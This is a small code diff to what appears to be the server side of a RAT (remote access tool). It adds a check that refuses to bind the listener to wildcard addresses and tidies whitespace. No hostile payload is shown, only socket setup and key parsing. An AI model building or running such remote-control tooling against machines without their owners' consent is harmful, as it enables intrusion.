@@ -107,8 +107,14 @@ def main():
     HOST = args.host
     PORT = args.port
     print(HOST)
-    print(PORT)    
+    print(PORT)
     KEY = binascii.unhexlify(args.key)
+
+    if HOST in ("", "0.0.0.0", "::"):
+        raise ValueError(
+            f"Refusing to bind RAT to wildcard address {HOST!r}. "
+            "Pass a specific interface IP via --host (e.g. 127.0.0.1)."
+        )
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((HOST, PORT))
